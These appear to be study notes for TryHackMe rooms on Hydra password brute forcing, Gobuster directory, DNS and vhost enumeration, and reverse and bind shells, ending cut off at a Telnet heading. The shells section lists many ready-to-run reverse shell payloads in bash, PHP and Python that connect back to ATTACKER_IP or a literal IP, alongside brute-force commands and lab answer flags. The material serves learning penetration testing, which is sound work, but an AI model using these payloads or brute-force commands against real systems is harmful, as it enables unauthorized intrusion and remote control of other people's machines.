# Hydra ![Hydra](hydra.png)

[Room](https://tryhackme.com/room/hydra)

## What is Hydra?
Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.

Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

According to its [official repository](https://github.com/vanhauser-thc/thc-hydra), Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

For more information on the options of each protocol in Hydra, you can check the [Kali Hydra tool page](https://en.kali.tools/?p=220).

This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use ```admin:password``` as the default login credentials, which is obviously not strong enough.

## Installing Hydra


Use the in-browser Kali machine, Hydra also comes pre-installed, as is the case with all Kali distributions. You can access it by selecting Use Kali Linux and clicking on Start Kali Linux button.

However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing ```apt install hydra ```or ```dnf install hydra```. Furthermore, you can download it from its official [THC-Hydra repository](https://github.com/vanhauser-thc/thc-hydra).




# Hydra Commands 

A concise reference for using **Hydra** to brute-force services (SSH, FTP, and web forms). Examples below assume you run Hydra from a Linux shell and have proper authorization to test the target.

---

## Table of contents

- [SSH brute force](#ssh-brute-force)
- [FTP example](#ftp-example)
- [HTTP POST form brute force](#http-post-form-brute-force)
- [Common options](#common-options)
- [Tips & safety](#tips--safety)

---

## SSH brute force

Use this to brute force SSH logins when you know the username and have a password list.

```bash
hydra -l <username> -P <full/path/to/password_list.txt> <MACHINE_IP> -t 4 ssh
```

**Example**

```bash
hydra -l root -P /home/user/passwords.txt 10.0.0.5 -t 4 ssh
```

This will:

- Try username `root`.
- Try passwords line-by-line from `/home/user/passwords.txt`.
- Use 4 parallel threads.
- Target SSH on `10.0.0.5`.


## FTP example

A simple FTP example when the username is `user` and the password list is `passlist.txt`:

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

## HTTP POST form brute force

When the login form uses `POST`, you must tell Hydra the request path, the form field names, and a string that appears in the response when login fails.

General syntax:

```bash
sudo hydra -l <username> -P <wordlist> <MACHINE_IP> http-post-form "<path>:<login_credentials>:<invalid_response>" -V
```

- `<path>` — path of the login endpoint (e.g., `/login.php` or `/`).
- `<login_credentials>` — e.g. `username=^USER^&password=^PASS^` where `^USER^` and `^PASS^` are placeholders.
- `<invalid_response>` — a string that appears only when login fails (Hydra uses this to detect failures).

**Concrete example**

If the login form is at the root `/` and the POST body uses `username` and `password` fields and fails with the string `F=incorrect`:

```bash
hydra -l <username> -P <wordlist> <MACHINE_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

**Example filled-in**

```bash
hydra -l admin -P /home/user/wordlists/rockyou.txt 10.0.0.5 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials" -V
```

Notes:
- Use your browser DevTools (Network tab) to inspect the exact POST body and failure response string.
- If fields are sent as JSON, or the site uses JavaScript-heavy requests (XHR/fetch), you will need to replicate that payload exactly or use another tool that can script the flow.


## Common options

| Option | Description |
|---|---|
| `-l` | Specify a single username (for services that accept a username) |
| `-L` | File containing multiple usernames (one per line) |
| `-P` | Password list file |
| `-p` | Single password |
| `-t` | Number of parallel tasks/threads |
| `-V` | Verbose: show every attempt |
| `-s` | Port number (if non-standard) |


## Tips & safety

- **Only test targets you are explicitly authorized to test.** Unauthorized brute forcing is illegal and unethical.
- Start with fewer threads (`-t 4`) to avoid overloading the target and to be less noisy.
- Use `-V` during testing to see each attempt, and remove it for quieter runs.
- For web forms, double-check the exact request format (field names, cookies, headers) with the browser DevTools.
- If the site uses CSRF tokens or dynamic tokens, Hydra might fail — consider programmatic approaches (e.g., custom scripts with `requests`/`curl`) that can fetch tokens per attemp


---

# Gobuster

## Introduction

Gobuster is a fast, open-source tool written in Go used during penetration tests to brute-force and enumerate web resources—such as directories and files, DNS subdomains, virtual hosts, and cloud buckets (S3/GCS)—by trying entries from wordlists; it sits between the reconnaissance and scanning phases and relies on good wordlists (e.g., SecLists) and tuned threads/extensions to be effective. Results are interpreted by HTTP status codes (200 = exists, 301/302 = redirect, 403 = forbidden but interesting, 404 = not found), but beware wildcard responses and WAF/rate-limiting which can cause false positives or blocks, so verify findings manually (curl or browser) and save output for analysis. Always start with targeted lists, low threads, and explicit authorization—illegal scanning is prohibited—and combine Gobuster with other tools for deeper discovery.

```bash

root@ip-10-201-2-2:~# gobuster --help
Usage:
  gobuster [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
  gcs         Uses gcs bucket enumeration mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  tftp        Uses TFTP enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)

Flags:
      --debug                 Enable debug output
      --delay duration        Time each thread waits between requests (e.g. 1500ms)
  -h, --help                  help for gobuster
      --no-color              Disable color output
      --no-error              Don't display errors
  -z, --no-progress           Don't display progress
  -o, --output string         Output file to write results to (defaults to stdout)
  -p, --pattern string        File containing replacement patterns
  -q, --quiet                 Don't print the banner and other noise
  -t, --threads int           Number of concurrent threads (default 10)
  -v, --verbose               Verbose output (errors)
  -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.
      --wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)

Use "gobuster [command] --help" for more information about a command.
```


- Usage: Shows the syntax on how to use the command.
- Available Commands: Multiple commands are available to aid us in enumerating directories, files, DNS subdomains, Google Cloud Storage buckets, and Amazon AWS S3 buckets.Focus on the ```dir```, ```dns```, and ```vhost``` commands. .
- Flags: These are specific options we can configure to customize our commands.

  
| Short Flag | Long Flag   | Description |
|------------|-------------|-------------|
| `-t`       | `--threads` | Configures the number of threads to use for the scan. Each thread sends requests concurrently; default is 10. Increase or decrease this value depending on wordlist size and system resources. |
| `-w`       | `--wordlist`| Specifies the wordlist to use for brute-forcing. Each wordlist entry is appended to the target URL during enumeration. |
| (none)     | `--delay`   | Sets the time (seconds) to wait between requests. Increasing delay can help avoid detection, rate-limiting, or WAF triggers by making traffic appear more normal. |
| (none)     | `--debug`   | Enables debug output to help troubleshoot unexpected errors or see verbose request/response details. |
| `-o`       | `--output`  | Writes enumeration results to the specified file for later analysis. |



**Example**
Let us look at an example of how we would use these commands and flags together to enumerate a web directory:

- gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
- gobuster dir indicates that we will use the directory and file enumeration mode.
- -u "http://www.example.thm/" tells Gobuster that the target URL is http://example.thm/.
- -w /usr/share/wordlists/dirb/small.txt directs Gobuster to use the small.txt wordlist to brute force the web directories. Gobuster will use each entry in the wordlist to form a new URL and send a GET request to that URL. If the first entry of the wordlist were images, Gobuster would send a GET request to http://example.thm/images/.
- -t 64 sets the number of threads Gobuster will use to 64. This improves the performance drastically.

  
## Use Case: Directory and File Enumeration

Gobuster has a dir mode, allowing users to enumerate website directories and their files. This mode is useful when you are performing a penetration test and would like to see what the directory structure of a website is and what files it contains. Often, directory structures of websites and web apps follow a particular convention, making them susceptible to Brute Force using wordlists. For example, the  directory structure on the web server hosting WordPress looks something  like this:

```bash
root@ip-10-201-2-2:~# tree -L 3 -d
.
\u251c\u2500\u2500 CTFBuilder
\u251c\u2500\u2500 Desktop
\u2502   \u251c\u2500\u2500 Additional Tools -> /opt/
\u2502   \u251c\u2500\u2500 NetworkConfigs
\u2502   \u2502   \u2514\u2500\u2500 logs
\u2502   \u2514\u2500\u2500 Tools
\u2502       \u251c\u2500\u2500 Binex
\u2502       \u251c\u2500\u2500 C2
\u2502       \u251c\u2500\u2500 Decompilers
\u2502       \u251c\u2500\u2500 Miscellaneous
\u2502       \u251c\u2500\u2500 Password Attacks
\u2502       \u251c\u2500\u2500 PEAS -> /opt/PEAS/
\u2502       \u251c\u2500\u2500 recon-ng
```


Gobuster is powerful because it allows you to scan the website and return the status codes. These status codes immediately tell you if you, as an outside user, can request that directory or not.


**Help**

If you want a complete overview of what the Gobuster ```dir``` command can offer, you can look at the help page. Seeing the extensive help page for the dir command can somewhat be intimidating. So, we will focus on the most essential flags in this room. Type the following command to display the help: ```gobuster dir --help``.

Many flags are used to fine-tune the ```gobuster dir``` command. It is out of scope to go over each one of them, but in the table below, we have listed the flags that cover most of the scenarios:


| Flag | Long Flag | Description |
|------|-----------|-------------|
| `-c` | `--cookies` | Pass a cookie with each request (e.g., session ID). |
| `-x` | `--extensions` | Specify file extensions to append during scans (e.g., `.php,.js`). |
| `-H` | `--headers` | Add a custom HTTP header to each request (e.g., `-H "X-Auth: token"`). |
| `-k` | `--no-tls-validation` | Skip TLS/SSL certificate verification (useful for self-signed certs in CTFs). |
| `-n` | `--no-status` | Hide HTTP status codes in output to keep display cleaner. |
| `-P` | `--password` | Supply a password for authenticated requests (used with `-U/--username`). |
| `-s` | `--status-codes` | Show only responses with these status codes (e.g., `200,301,403` or ranges like `300-399`). |
| `-b` | `--status-codes-blacklist` | Hide responses with these status codes; this overrides `-s`. |
| `-U` | `--username` | Supply a username for authenticated requests (use with `-P/--password`). |
| `-r` | `--followredirect` | Follow HTTP redirects (e.g., 301/302) returned by the server. |


**How To Use dir Mode**

To run Gobuster in dir mode, use the following command format:

```bash
gobuster dir -u "http://www.example.thm" -w /path/to/wordlist
```
**Q&A
- Which flag do we have to add to our command to skip the TLS verification? Enter the long flag notation.
--no-tls-validation


- Enumerate the directories of www.offensivetools.thm. Which directory catches your attention?
secret


- Continue enumerating the directory found in question 2. You will find an interesting file there with a .js extension. What is the flag found in this file?
THM{ReconWasASuccess}


## Use Case: Subdomain Enumeration

The next mode we’ll focus on is the dns mode. This mode allows Gobuster to brute force subdomains. During a penetration test,  checking the subdomains of your target’s top domain is essential. Just because something is patched in the regular domain, it doesn't mean it is also patched in the subdomain. An opportunity to exploit a vulnerability in one of these subdomains may exist. For example, if TryHackMe owns tryhackme.thm and mobile.tryhackme.thm, there may be a vulnerability in mobile.tryhackme.thm that is not present in tryhackme.thm. That is why it is important to search for subdomains as well!

**Help**

If you want a complete overview of what the Gobuster dns command can offer, you can have a look at the help page. Seeing the extensive help page for the dns command can be intimidating. So, we will focus on the most important flags in this room. Type the following command to display the help: gobuster dns --help

The dns mode offers fewer flags than the dir mode. But these are more than enough to cover most DNS subdomain enumeration scenarios. Let us have a look at some of the commonly used flags:

  
| Flag | Long Flag        | Description |
|------|------------------|-------------|
| `-c` | `--show-cname`   | Show CNAME records for discovered subdomains. (Cannot be used with `-i/--show-ips`.) |
| `-i` | `--show-ips`     | Display IP addresses that the domain and discovered subdomains resolve to. |
| `-r` | `--resolver`     | Use a custom DNS resolver/server for lookups (e.g., `-r 8.8.8.8`). |
| `-d` | `--domain`       | Specify the target domain to enumerate (e.g., `-d example.com`). |

**How to Use dns Mode**
To run Gobuster in dns mode, use the following command syntax:
```gobuster dns -d example.thm -w /path/to/wordlist```

Notice that the command also includes the flags -d and -w, in addition to the dns keyword. These two flags are required for the Gobuster subdomain enumeration to work. Let us look at an example of how to enumerate  subdomains with Gobuster dns mode:

gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

- ```gobuster dns`` enumerates subdomains on the configured domain.
- ```-d example.thm``` sets the target to the example.thm domain.
- ```-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt``` sets the wordlist to subdomains-top1million-5000.txt. Gobuster uses each entry of this list to construct a new DNS query. If the first entry of this list is 'all', the query would be all.example.thm.
Go ahead and enter the command for yourself. You should get the following output:

```bash
root@ip-10-201-2-2:~# gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     example.thm
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.example.thm
                                                                                                                                                            
Found: shop.example.thm
                                                                                                                                                            
Found: academy.example.thm
                                                                                                                                                            
Found: primary.example.thm
                                                                                                                                                            
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
=============================================================== 
```

**Q&A**
- Apart from the dns keyword and the -w flag, which shorthand flag is required for the command to work?

-d

- Use the commands learned in this task, how many subdomains are configured for the offensivetools.thm domain?

4

## Use Case: Vhost Enumeration

The last and final mode we’ll focus on is the vhost mode. This mode allows Gobuster to brute force virtual hosts. Virtual hosts are different websites on the same machine. Sometimes, they look like subdomains, but don’t be deceived! Virtual hosts are IP-based and are running on the same server. Subdomains are set up in DNS. The  difference between vhost and dns mode is in the way Gobuster scans:

- vhost mode will navigate to the URL created by combining the configured HOSTNAME (-u flag) with an entry of a wordlist.
- dns mode will do a DNS lookup to the FQDN created by combining the configured domain name (-d flag) with an entry of a wordlist.

**Help**

If you want a complete overview of what the Gobuster vhost command can offer, you can have a look at the help page. Seeing the extensive help page for the vhost command can be intimidating. So, we will focus on the most important flags in this room. Type the  following command to display the help: ```gobuster vhost --help```

The vhost mode offers flags similar to those of the dir mode. Let us have a look at some of the commonly used flags:

| Short Flag | Long Flag         | Description |
|------------|-------------------|-------------|
| `-u`       | `--url`           | Specifies the base URL (target domain) for brute-forcing virtual hostnames. |
| (none)     | `--append-domain` | Appends the base domain to each word in the wordlist (e.g., `word.example.com`). |
| `-m`       | `--method`        | Specifies the HTTP method to use for requests (e.g., `GET`, `POST`). |
| (none)     | `--domain`        | Appends a domain to each wordlist entry to form a valid hostname (useful if not provided explicitly). |
| (none)     | `--exclude-length`| Excludes results based on the response body length (useful to filter out unwanted responses). |
| `-r`       | `--follow-redirect` | Follow HTTP redirects (useful when subdomains or vhosts redirect). |


** How To Use vhost Mode**
To run Gobuster in vhost mode, type the following command:

```gobuster vhost -u "http://example.thm" -w /path/to/wordlist```

Notice that the command also includes the flags -u and -w, in addition to the vhost keyword. These two flags are required for the Gobuster vhost enumeration to work. Let us look at a practical example of how to enumerate virtual hosts with Gobuster vhost
```bash
root@tryhackme:~# gobuster vhost -u "http://10.201.100.102" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.10.94.214
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
[+] Append Domain:    true
[+] Exclude Length:   250,254,263,274,283,293,294,299,253,261,269,277,285,290,300,257,258,270,278,282,291,252,260,264,268,271,279,280,289,251,256,262,265,272,297,287,292,295,255,266,276,284,286,296,267,273,275,281,288,259,298
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: blog.example.thm Status: 200 [Size: 1493]
Found: shop.example.thm Status: 200 [Size: 2983]
Found: www.example.thm Status: 200 [Size: 84352]
Found: chelyabinsk-rnoc-rr02.backbone.example.thm Status: 404 [Size: 304]
Found: academy.example.thm Status: 200 [Size: 434]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```
You will notice that this command is much more complex than the base command syntax. It contains many more configured flags. This will often be the case in realistic tests, depending on how the infrastructure of the domain to test has been set up. In our case, we don't have a fully set up DNS infrastructure. This requires us to give in extra flags like --domain and --append-domain. We need to look at the web requests Gobuster sends to understand better how these flags work. Below, you can see a basic GET request to www.example.thm:

```GET / HTTP/1.1
Host: www.example.thm
User-Agent: gobuster/3.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Gobuster will send multiple requests, each time changing the Host: part of the request. The value of Host: in this example is www.example.thm. We can break this down into three parts:
```
- www: This is the subdomain. This is the part that Gobuster will fill in with each entry of the configured wordlist.
- .example: This is the second-level domain. You can configure this with the --domain flag (this needs to be configured together with the top-level domain).
- .thm: This is the top-level domain. You can configure this with the --domain flag (this needs to be configured together with the second-level domain).

Now that we know how Gobuster sends its request, let's break down the command and examine each flag more closely:

- gobuster vhost instructs Gobuster to enumerate virtual hosts.
-u "http://10.201.100.102" sets the URL to browse to 10.201.100.102.
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt configures Gobuster to use the subdomains-top1million-5000.txt wordlist. Gobuster appends each entry in the wordlist to the configured domain. If no domain is explicitly configured with the --domain flag, Gobuster will extract it from the URL. E.g., test.example.thm, help.example.thm, etc. If any subdomains are found, Gobuster will report them to you in the terminal.
--domain example.thm sets the top- and second-level domains in the Hostname: part of the request to example.thm.
--append-domain appends the configured domain to each entry in the wordlist. If this flag is not configured, the set hostname would be www, blog, etc. This will cause the command to work incorrectly and display false positives.
--exclude-length filters the responses we get from the sent web requests. With this flag, we can filter out the false positives. If you run the command without this flag, you will notice you will get a lot of false positives like "Found: Orion.example.thm Status: 404 [Size: 279]" or  "Found: pm.example.thm Status: 404 [Size: 276]". These false positives typically have a similar response size, so we can use this to filter out most false positives. We expect to get a 200 OK response back to have a true positive. There are, however, exceptions, but it is not in the scope of this room to go deeper into these.

**Q&A**
Use the commands learned in this task to answer the following question: How many vhosts on the offensivetools.thm domain reply with a status code 200?
4

---
![shell](shell.png)
 # Shells Overview

## Introduction

A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

- Remote System Control: allows the attacker to execute commands or software remotely in the target system.
- Privilege Escalation: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
- Data Exfiltration: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
- Persistence and Maintenance Access: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
- Post-Exploitation Activities: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
- Access Other Systems on the Network: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.


## Reverse Shell

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

**How Reverse Shells Work**

Set up a Netcat (nc) Listener

Let's now understand how a reverse shell works in a practical scenario using the tool Netcat. This utility supports multiple OSs and allows reading and writing through a network.
Netcat to listen to a connection using the following command ```nc -lvnp 443```.

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

-  -l option to indicate Netcat to listen or wait for a connection.
-  -v option enables verbose mode.
-   -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally,
-    -p flag indicates the port that will be used to wait for the connection, in the case above, port 443.


Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.


**Gaining Reverse Shell Access**

Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system.


As an example, let's analyze an example payload named a pipe reverse shell, as shown below.

```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f```

Explanation of the Payload

- ```rm -f /tmp/f``` This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
- ```mkfifo /tmp/f```This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- ```cat /tmp/f``` This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- ```| bash -i 2>&1``` The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- ```| nc ATTACKER_IP ATTACKER_PORT >/tmp/f``` This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
- ```>/tmp/f```This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

  The payload above can expose the shell ```bash``` through the network to the desired listener.

**Attacker Receives the Shell**

Once the above payload is executed, the attacker will receive a reverse shell, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

**Q&A*
- What type of shell allows an attacker to execute commands remotely after the target connects back?

Reverse Shell


- What tool is commonly used to set up a listener for a reverse shell?
Netcat

## Bind Shell


As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

** How bind shells work**
Setting Up the Bind Shell on the Target

Let's create a bind shell. In this case, the attacker can use a command like the one below on the target machine.

```rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f```

Explanation of the Payload
- ```rm -f /tmp/f ```This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
- ```mkfifo /tmp/f``` This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- ```cat /tmp/f ```This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- ```| bash -i 2>&1```The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
- ```| nc -l 0.0.0.0 8080``` Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.
- ```>/tmp/f``` This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.
The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.

```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Once the command is executed, it will wait for an incoming connection, as shown above.
Attacker Connects to the Bind Shell

Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.
```bash
nc -nv TARGET_IP 8080
```
Explanation of the command
- nc - This invokes Netcat, which establishes the connection to the target.
-n - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
-v - Verbose mode provides detailed output of the connection process, such as when the connection is established.
- TARGET_IP - The IP address of the target machine where the bind shell is running.
- 8080 - The port number on which the bind shell listens.


```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open



## Shell Listeners

**Rlwrap**

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

Usage Example (Enhancing a Netcat Shell With Rlwrap)

```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.
```

**Ncat** 

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).

Usage Example (Listening for Reverse Shells)

```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

Usage Example (Listening for Reverse Shells with SSL)
```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
The --ssl option enables SSL encryption for the listener.
```
**Socat**

It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

Default Usage Example (Listening for Reverse Shell):

```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```
The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.

**Q&A**
- Which flexible networking tool allows you to create a socket connection between two data sources?

socat

- Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?

rlwrap


- What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?

ncat


## Shell Payloads


### Bash

**Normal Bash Reverse Shell**

```bash
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.

---
**Bash Read Line Reverse Shell**

```bash
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5;
```
This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

---
**Bash With File Descriptor 196 Reverse Shell**

```bash
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.
---

**Bash With File Descriptor 5 Reverse Shell**


```bash
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.
---

### PHP

**PHP Reverse Shell Using the exec Function**


```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.

---
**PHP Reverse Shell Using the shell_exec Function**


```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
Similar to the previous command, but uses the shell_exec function.
---

**PHP Reverse Shell Using the system Function**

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
This reverse shell employs the system function, which executes the command and outputs the result to the browser.
---

**PHP Reverse Shell Using the passthru Function***

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.
---

**PHP Reverse Shell Using the popen Function**

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```
This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.
---
### Python

The following snippets below require using python -c to run, indicated by the placeholder PY-C
Python Reverse Shell by Exporting Environment Variables

```bash
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.
---
**Python Reverse Shell Using the subprocess Module**

```bash
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.
---
**Short Python Reverse Shell**

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

Others
---
### Telnet

```bash
